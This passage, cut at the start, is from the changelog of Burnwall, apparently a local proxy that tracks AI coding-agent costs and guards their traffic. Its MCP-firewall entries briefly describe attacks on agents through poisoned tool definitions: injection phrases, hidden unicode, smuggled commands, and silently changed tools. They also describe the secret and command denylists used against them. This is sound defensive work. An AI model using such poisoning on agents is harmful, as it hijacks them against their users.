  proxy now records each forwarded request's upstream latency and HTTP status.
- **`burnwall digest [--days N] [--json]`** — an Agent Bill of Materials for a
  window: which models ran and what they cost, which MCP servers/tools were
  touched, how many tool calls were made, which security checks fired, and total
  turns. Assembled from existing metadata; never reads prompt content.
- **OpenTelemetry GenAI spans** (`[observability].otel_spans`, opt-in). Each
  forwarded request emits one span following the OTel GenAI semantic conventions
  (`gen_ai.*`) as line-delimited JSON to a local file (`otel_file`). Payload-free
  and file-only — no network export, consistent with Burnwall's zero-telemetry
  stance. Interop without leaking prompts.
- **Google Gemini support** — `/google/*` route to the Gemini API, a
  `generateContent` + SSE response parser (`usageMetadata` token accounting with
  cached-content split and thinking-token folding), and pricing for
  `gemini-2.5-pro`, `gemini-2.5-flash`, and `gemini-2.0-flash`.

## [0.6.5] — 2026-05-26

### Added

- `burnwall mcp-watch` can front **multiple MCP servers** from a single watcher,
  routed by the first path segment. Configure them under `[[mcp.servers]]`; a
  `--upstream` still works as the fallback for unmatched paths.
- **MCP tool approval workflow.** Enforce mode (`mcp.require_approval`, or
  `--require-approval`) holds a `tools/call` to a tool you haven't approved with a
  403 until you approve it; a tool whose definition later changes is reset to
  pending automatically. Manage approvals with `burnwall mcp list`,
  `burnwall mcp approve <server> [tool]`, and `burnwall mcp revoke`. Off by
  default — the watcher stays observe-only until you opt in.
- `burnwall mcp export [--days N] [--format json|csv]` — export the MCP audit log
  (tool calls plus MCP-side security events) as JSON or CSV.
- **Egress / DLP check** (`[security].dlp`, opt-in). Blocks Luhn-valid credit-card
  numbers and US Social Security numbers in outbound payloads, including inside MCP
  tool-call arguments. Reports the category (e.g. "credit card number"), never the
  value.

## [0.6.0] — 2026-05-25

### Added

- **Community security rule packs.** Declarative TOML packs that extend the
  path / command / secret denylist. Bundled official packs ship in the binary:
  `django`, `react`, `infrastructure`, `data-science`. `burnwall rules list`,
  `burnwall rules install <id>`, and `burnwall rules test <pack> <file>` (a
  playground that shows what a pack would block against a sample request).
- **Third-party rule packs** via `burnwall rules add <file>` with
  Trust-On-First-Use: you review exactly what a pack adds, its contents are
  SHA-256-pinned, and any later edit re-prompts for approval. `burnwall rules
  revoke` removes one.
- More built-in secret patterns: Google API key, Google OAuth client secret,
  Stripe live keys, GitHub fine-grained PAT, npm token, SendGrid key.

### Security

- Rule packs are **deny-only / append-only** by construction — a pack can only add
  restrictions, never loosen them, and cannot toggle global switches. User-authored
  regexes are size-capped and compiled with the non-backtracking `regex` engine, so
  a malformed or hostile pattern is skipped rather than able to hang the proxy.

## [0.5.0] — 2026-05-25

### Added

- **MCP firewall.** `burnwall mcp-watch` now inspects `tools/list` responses for
  tool poisoning (injection phrases, hidden/zero-width unicode, smuggled
  paths/commands/secrets) and rug-pulls (a tool's definition silently changing
  after you've seen it). Findings are recorded as security events; responses are
  forwarded byte-for-byte unchanged.
- Cross-tool cost tracking now also reads **OpenCode** and **Aider** session logs,
  alongside Claude Code and Codex.
- `docs/SECURITY_FRAMEWORKS.md` — maps Burnwall's coverage to the OWASP LLM /
  Agentic Top 10 and the EU AI Act (honest about partial coverage).

### Changed

- The `[tools]` config section gained `opencode` and `aider` toggles (default on).

## [0.4.0] — 2026-05-25

### Added

- `burnwall waste` — an advisory report of cost-waste patterns found in your
  local AI session logs, each line annotated with its estimated dollar impact.
  Read-only; it never reads prompt content. Detects prompt-cache starvation,
  flagship-model use on trivial requests, heavy reasoning on routine prompts,
  requests near the context-window limit, runaway context growth within a
  session, and very long sessions. The headline figure is capped at what was
  actually spent. `--days N` and `--json` supported.
- `burnwall explore` — spend broken down by model, by tool, and by workspace
  over a window. `--days N` and `--json` supported.
- Monthly burndown in `burnwall history` — month-to-date spend, an ideal-pace
  line, and an end-of-month projection against the configured monthly budget.
- `burnwall status` shows a one-line teaser of average avoidable spend per day
  when there is any, with a pointer to `burnwall waste`.
- `burnwall config doctor` — prints the effective configuration and flags
  deprecated or unknown keys, out-of-range values, and any safety toggle that
  is turned on. Exits non-zero on an error-level problem.

### Changed

- New `[tools]` config section toggles log scraping per tool (`claude_code`,
  `codex`). It supersedes the old `[log_scrape]` switch, which still works for
  one release as a global on/off.
- New `[waste]` config section with `enabled` (default on) gates the advisory
  engine and the `status` teaser.
- `security.enabled = false` now actually disables request scanning; it was
  previously accepted but ignored.

## [0.3.2] — 2026-05-17

### Fixed

- Security scan no longer fails-open on a request body that starts with
  a UTF-8 BOM (`EF BB BF`). The JSON parser used to reject the BOM and
  the fail-open arm forwarded the request unscanned; the scanner now
  strips a leading BOM before parsing. The same fix lands on
  `extract_model`, the cache-injection rewriter, the cache-savings
  projection, and the MCP `tools/call` parser so they stay consistent.
  Found during pre-launch user-journey testing on Windows.

## [0.3.1] — 2026-05-16

### Changed

- CLI `--help` summary and the library crate doc now match the README
  positioning ("local proxy for AI coding tools"). The CLI summary is
  driven from `Cargo.toml` so the two cannot drift again. No
  functional changes.

## [0.3.0] — 2026-05-16

### Added

- Anthropic prompt-cache auto-injection. When enabled, outbound Messages
  API requests with no existing `cache_control` markers get an
  ephemeral marker added on the system prompt and the first message,
  so the cached read tier applies on subsequent turns. Existing
  markers are always respected and never overridden. Off by default;
  enable via `proxy.cache_injection = true` in config or with
  `burnwall start --rewrite-anthropic-cache`. The startup banner
  shows whether injection is on.
- "Would-have-cached" projection. When injection is off,
  `burnwall status` reports a per-day USD estimate of the savings
  you would have captured if it had been on. Surfaced as a line in
  the table view and a `projected_cache_savings_usd` field in
  `--json` output.
- `burnwall mcp-watch <upstream>` — pass-through proxy in front of an
  upstream MCP HTTP server. Forwards every request unchanged, streams
  responses back, and records JSON-RPC `tools/call` invocations
  (tool name, request id, upstream HTTP status) to a new `mcp_events`
  table. Argument payloads are deliberately not stored — they can
  contain prompt content. `--port` and `--host` flags are available
  for binding; defaults are `127.0.0.1:4101`.
- Security denylist extended to MCP. `burnwall mcp-watch` runs every
  request body through the same security engine the LLM proxy uses,
  so denied paths, commands, network mounts, and secret patterns are
  blocked when they appear inside `tools/call` arguments. A violation
  returns 403, never forwards to the upstream MCP server, and writes
  a `security_events` row with `provider = "mcp"` and the tool name —
  `burnwall security` shows these alongside LLM-side blocks. The
  per-project `.burnwall.yaml` profile (including `allow_paths`
  exceptions) applies too.
- `burnwall status` carries a count line for MCP `tools/call`
  invocations recorded today when the count is non-zero.

## [0.2.0] — 2026-05-16

### Added

- Background daemon mode. `burnwall start --daemon` runs the proxy in
  the background and writes a PID file under the data directory; the
  file is removed on graceful shutdown and stale files self-clean on
  sight. A second `start` against a live daemon refuses cleanly.
- `burnwall stop` now actually terminates a running daemon (graceful
  shutdown on Unix; immediate stop on Windows, safe because each
  storage write is its own transaction).
- Loop detector. Runaway agents that keep firing the same request, or
  burn cost faster than a configurable rate, get cut off with a 429
  before they drain the budget.
- `burnwall security` command — table or `--json` view of blocked
  requests with rule, provider, model, and timestamp.
- Per-project security profiles via `.burnwall.yaml`, discovered by
  walk-up from the current working directory. Supports `allow_paths`
  exceptions, additional `deny_paths`, and a per-project
  `budget.daily_max_usd` cap (can only tighten the global limit).
- Cross-tool cost tracking for tools that don't go through the proxy.
  `burnwall status` aggregates from local Claude Code and Codex CLI
  session logs alongside proxied traffic, with a combined-total line
  and a separate `log_scrape` key in `--json` output. Read-only — no
  database writes from log scraping.
- Local-time "today". `status`, `history`, and `security` now bucket
  by your local calendar day; timestamps are still stored in UTC
  internally. Fixes the off-by-one where late-UTC-day `status` showed
  an empty bucket.
- Pricing data freshness warning — `burnwall status` flags when the
  embedded rate card is more than 30 days old.
- Shell completions. `burnwall completions <shell>` emits scripts for
  bash, zsh, fish, powershell, and elvish.
- Path redaction in storage: `security.log_redact_details` redacts the
  matched-rule detail in `security_events` rows while leaving the 403
  response unaffected (D13 mitigation).
- `--json` output is now consistent across every command, including
  `config show`.
- README documents the scope of what Burnwall guards: it sits on the
  LLM API path, and MCP traffic is intentionally out of scope for
  this milestone. `burnwall status` carries a one-line scope footer.

### Changed

- Headline copy on the README and `Cargo.toml` description now leads
  with "local proxy for AI coding tools."

## [0.1.0] — initial feature set

### Added

- HTTP reverse proxy on `localhost:4100` routing `/anthropic/*` to
  `api.anthropic.com` and `/openai/*` to `api.openai.com`. SSE streaming
  responses pass through unmodified.
- Provider response parsers (Anthropic, OpenAI) for both non-streaming and
  SSE-streaming responses with cache-aware token accounting.
- Pricing database for Anthropic Opus/Sonnet/Haiku 4.x and OpenAI gpt-5.x;
  date-suffix-tolerant model lookup.
- Cache-aware cost calculator (`cost`, `cost_without_cache`, `cache_savings`).
- SQLite storage (`~/.burnwall/burnwall.db`) for `requests`,
  `security_events`, and `daily_summary`. `0700`/`0600` permissions on
  Unix; user-profile ACL on Windows. Unencrypted on disk by design — it
  holds only metadata (no API keys, no prompt content).
- Security engine — schema-agnostic JSON walker matching denied paths
  (with `~/`, expanded-Unix, and Windows-UNC tolerance), denied commands,
  network mounts (`/Volumes/`, `\\`, `smb://`, `nfs://`), and secret
  patterns (AWS access key, private key header, GitHub PAT, OpenAI/
  Anthropic/Slack tokens). Fail-open on non-JSON bodies.
- Atomic budget tracker — `AtomicU64` storing **microcents** for sub-cent
  precision (1000 small `gpt-5.4-mini` requests still register correctly).
  Hydrates from storage on startup.
- End-to-end pipeline: route → security check (403 + audit row on hit) →
  budget check (429 on exceeded) → forward → tee response stream → parse
  usage → record cost in storage and budget counter.
- CLI: `burnwall start`, `status`, `history`, `config set/show`, `init`,
  `stop` (v0.1 stub).
- TOML config at `~/.burnwall/config.toml` with `#[serde(default)]` so
  partial files round-trip. `BURNWALL_DATA_DIR` env var override for
  hermetic CLI integration tests.
- GitHub Actions: CI matrix (ubuntu / macOS / windows; build + test +
  rustfmt + clippy) and release workflow (per-target archives, GitHub
  Release with auto-generated notes on `v*` tag push).
